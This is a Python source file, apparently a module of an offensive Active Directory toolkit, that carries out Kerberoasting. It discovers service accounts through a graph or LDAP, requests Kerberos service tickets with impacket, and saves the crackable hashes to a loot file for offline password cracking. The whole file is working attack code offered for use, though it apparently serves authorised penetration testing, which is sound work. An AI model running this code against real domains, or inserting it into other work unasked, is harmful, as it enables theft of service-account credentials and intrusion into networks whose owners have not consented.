"""Kerberoasting — request service tickets (TGS) for accounts that have a
servicePrincipalName and dump their crackable hashes.

Any authenticated domain user can request a TGS for a service account; the
ticket is encrypted with the service account's password key, so it can be
cracked offline. Targets come from the graph (flagged by recon/ldap_enum) or,
failing that, a live LDAP query.
"""

from __future__ import annotations

from adreaper.core.context import EngagementContext
from adreaper.core.graph import NodeType
from adreaper.core.logging import log
from adreaper.core.module import BaseModule, ModuleResult, Option, OptionType, Severity
from adreaper.modules.kerberos.common import crack_hint, format_tgs_hash


class Kerberoast(BaseModule):
    name = "kerberos/kerberoast"
    description = "Request TGS hashes for SPN-bearing service accounts."
    author = "Mealmeu"
    category = "kerberos"
    requires = ["impacket"]
    references = ["https://attack.mitre.org/techniques/T1558/003/"]
    options = [
        Option("user", "Target SPN account(s), comma-separated (overrides graph targets)",
               type=OptionType.STRING),
    ]

    def run(self, ctx: EngagementContext) -> ModuleResult:
        res = self.result()
        domain = ctx.domain
        kdc = ctx.dc_ip or ctx.primary_target() or domain
        cred = ctx.credential
        if not domain:
            return res.fail("no domain set (use --domain)").finish()
        if cred.is_empty or not cred.has_secret or not cred.username:
            return res.fail("kerberoasting needs valid domain credentials (-u/-p or -H)").finish()

        targets = self._targets(ctx)
        if not targets:
            return res.fail(
                "no SPN targets: run recon/ldap_enum first, or pass -o user=svc1,svc2"
            ).finish()
        log.info("kerberoasting %d service account(s) via KDC %s", len(targets), kdc)

        try:
            tgt, tgt_cipher, session_key = self._get_tgt(cred, domain, kdc)
        except Exception as e:
            return res.fail(f"TGT request failed: {e}").finish()

        hashes: list[str] = []
        for sam, spn in targets:
            try:
                etype, cipher = self._roast(spn, domain, kdc, tgt, tgt_cipher, session_key)
            except Exception as e:
                log.debug("%s (%s) failed: %s", sam, spn, e)
                continue
            h = format_tgs_hash(etype, sam, domain, spn, cipher)
            hashes.append(h)
            log.ok("roasted %s [%s] (etype %d)", sam, spn, etype)
            res.add_finding(
                f"Kerberoast hash captured: {sam}",
                Severity.HIGH,
                description="Service account TGS obtained; crack offline to recover its password.",
                evidence=h,
                target=sam,
                references=self.references + [crack_hint("tgs")],
            )
            node = ctx.graph.get(sam)
            hits = ctx.graph.find(sam, NodeType.USER)
            node = node or (hits[0] if hits else None)
            if node:
                node.properties["tgs_hash"] = True

        if hashes:
            out = ctx.loot_dir() / "kerberoast_hashes.txt"
            out.write_text("\n".join(hashes) + "\n", encoding="utf-8")
            res.data["hash_file"] = str(out)
            log.ok("%d hash(es) -> %s", len(hashes), out)
            log.info(crack_hint("tgs"))
        res.data["captured"] = len(hashes)
        return res.finish()

    # -- target selection -------------------------------------------------

    def _targets(self, ctx: EngagementContext) -> list[tuple[str, str]]:
        """Return list of (sAMAccountName, spn)."""
        raw = self.opt("user")
        wanted = {u.strip().lower() for u in raw.split(",")} if raw else None

        out: list[tuple[str, str]] = []
        for n in ctx.graph.nodes_of(NodeType.USER):
            spns = n.properties.get("spn") or []
            if not spns:
                continue
            if wanted is not None and n.name.lower() not in wanted:
                continue
            out.append((n.name, spns[0]))
        if out:
            return out
        # LDAP fallback if the graph has nothing
        return self._ldap_targets(ctx, wanted)

    def _ldap_targets(self, ctx, wanted):
        try:
            from ldap3 import ALL, NTLM, SUBTREE, Connection, Server  # type: ignore
        except ImportError:
            log.warn("no graph targets and ldap3 not installed for fallback discovery")
            return []
        cred = ctx.credential
        host = ctx.dc_ip or ctx.primary_target()
        try:
            server = Server(host, get_info=ALL, connect_timeout=ctx.timeout)
            user = f"{cred.domain}\\{cred.username}" if cred.domain else cred.username
            conn = Connection(server, user=user, password=cred.normalized_hash() or cred.password,
                              authentication=NTLM, auto_bind=True)
            base = ",".join(f"DC={p}" for p in ctx.domain.split("."))
            conn.search(base, "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))",
                        search_scope=SUBTREE, attributes=["sAMAccountName", "servicePrincipalName"])
        except Exception as e:
            log.warn("LDAP fallback discovery failed: %s", e)
            return []
        out = []
        for entry in conn.response:
            if entry.get("type") != "searchResEntry":
                continue
            a = entry["attributes"]
            sam = _first(a.get("sAMAccountName"))
            spns = a.get("servicePrincipalName") or []
            spn = spns[0] if isinstance(spns, (list, tuple)) and spns else spns
            if sam and spn and (wanted is None or sam.lower() in wanted):
                out.append((sam, str(spn)))
        return out

    # -- kerberos ---------------------------------------------------------

    def _get_tgt(self, cred, domain, kdc):
        from binascii import unhexlify

        from impacket.krb5 import constants
        from impacket.krb5.kerberosv5 import getKerberosTGT
        from impacket.krb5.types import Principal

        lm = nt = b""
        if cred.nt_hash:
            lmhex, nthex = cred.normalized_hash().split(":", 1)
            lm, nt = unhexlify(lmhex), unhexlify(nthex)
        principal = Principal(cred.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, cipher, _old, session_key = getKerberosTGT(
            principal, cred.password, domain.upper(), lm, nt, cred.aes_key or "", kdc,
        )
        return tgt, cipher, session_key

    def _roast(self, spn, domain, kdc, tgt, tgt_cipher, session_key):
        from impacket.krb5 import constants
        from impacket.krb5.asn1 import TGS_REP
        from impacket.krb5.kerberosv5 import getKerberosTGS
        from impacket.krb5.types import Principal
        from pyasn1.codec.der import decoder

        server = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs, _cipher, _old, _sk = getKerberosTGS(server, domain.upper(), kdc,
                                                 tgt, tgt_cipher, session_key)
        rep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        etype = int(rep["ticket"]["enc-part"]["etype"])
        cipher = bytes(rep["ticket"]["enc-part"]["cipher"].asOctets())
        return etype, cipher


def _first(v, default=""):
    if isinstance(v, (list, tuple)):
        return v[0] if v else default
    return v if v is not None else default
